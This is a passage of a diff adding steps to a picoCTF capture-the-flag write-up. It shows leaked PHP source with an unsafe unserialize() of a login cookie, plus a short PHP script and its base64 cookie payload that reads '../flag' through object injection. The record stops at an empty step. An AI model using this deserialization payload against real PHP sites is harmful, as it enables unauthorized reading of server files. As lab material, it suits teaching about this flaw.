@@ -87,3 +87,183 @@ if(isset($_POST["user"]) && isset($_POST["pass"])){
 	</body>
 </html>
 ```
+
+7. We got clue, there's 2 `.php` file, namely `cookie.php` and `authentication.php`, let's go there by adding the `s` character behind it.
+8. First, i went to `cookie.phps`.
+
+```php
+<?php
+session_start();
+
+class permissions
+{
+	public $username;
+	public $password;
+
+	function __construct($u, $p) {
+		$this->username = $u;
+		$this->password = $p;
+	}
+
+	function __toString() {
+		return $u.$p;
+	}
+
+	function is_guest() {
+		$guest = false;
+
+		$con = new SQLite3("../users.db");
+		$username = $this->username;
+		$password = $this->password;
+		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
+		$stm->bindValue(1, $username, SQLITE3_TEXT);
+		$stm->bindValue(2, $password, SQLITE3_TEXT);
+		$res = $stm->execute();
+		$rest = $res->fetchArray();
+		if($rest["username"]) {
+			if ($rest["admin"] != 1) {
+				$guest = true;
+			}
+		}
+		return $guest;
+	}
+
+        function is_admin() {
+                $admin = false;
+
+                $con = new SQLite3("../users.db");
+                $username = $this->username;
+                $password = $this->password;
+                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
+                $stm->bindValue(1, $username, SQLITE3_TEXT);
+                $stm->bindValue(2, $password, SQLITE3_TEXT);
+                $res = $stm->execute();
+                $rest = $res->fetchArray();
+                if($rest["username"]) {
+                        if ($rest["admin"] == 1) {
+                                $admin = true;
+                        }
+                }
+                return $admin;
+        }
+}
+
+if(isset($_COOKIE["login"])){
+	try{
+		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
+		$g = $perm->is_guest();
+		$a = $perm->is_admin();
+	}
+	catch(Error $e){
+		die("Deserialization error. ".$perm);
+	}
+}
+
+?>
+
+```
+
+9. If you read carefully, you can see there's a deserializer. Let's remember that!
+
+```php
+if(isset($_COOKIE["login"])){
+	try{
+		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
+		$g = $perm->is_guest();
+		$a = $perm->is_admin();
+	}
+	catch(Error $e){
+		die("Deserialization error. ".$perm);
+	}
+}
+
+```
+
+10. Next, i opened the `authentication.phps`. 
+
+```php
+<?php
+
+class access_log
+{
+	public $log_file;
+
+	function __construct($lf) {
+		$this->log_file = $lf;
+	}
+
+	function __toString() {
+		return $this->read_log();
+	}
+
+	function append_to_log($data) {
+		file_put_contents($this->log_file, $data, FILE_APPEND);
+	}
+
+	function read_log() {
+		return file_get_contents($this->log_file);
+	}
+}
+
+require_once("cookie.php");
+if(isset($perm) && $perm->is_admin()){
+	$msg = "Welcome admin";
+	$log = new access_log("access.log");
+	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
+} else {
+	$msg = "Welcome guest";
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+<link href="style.css" rel="stylesheet">
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+</head>
+	<body>
+		<div class="container">
+			<div class="row">
+				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
+					<div class="card card-signin my-5">
+						<div class="card-body">
+							<h5 class="card-title text-center"><?php echo $msg; ?></h5>
+							<form action="index.php" method="get">
+								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
+							</form>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
+
+```
+
+11. The access_log object is the vuln, because we can create an access_log object that will read "../flag", pass it to the deserialzer then encode it with base64 and pass it into the login cookie to trigger the deserialization error, then the flag will be given to us. 
+
+12. Using this online [editor](https://onlinephp.io/), paste this code below, then click execute:
+
+```php
+<?php
+
+class access_log
+{
+	public $log_file = "../flag";
+}
+
+print(urlencode(base64_encode(serialize(new access_log))))
+
+?>
+```
+
+> OUTPUT:
+
+```
+TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
+```
+
+13. Copy the output and paste it as new cookie at this website -> `http://mercury.picoctf.net:25395/authentication.php`
+14. 
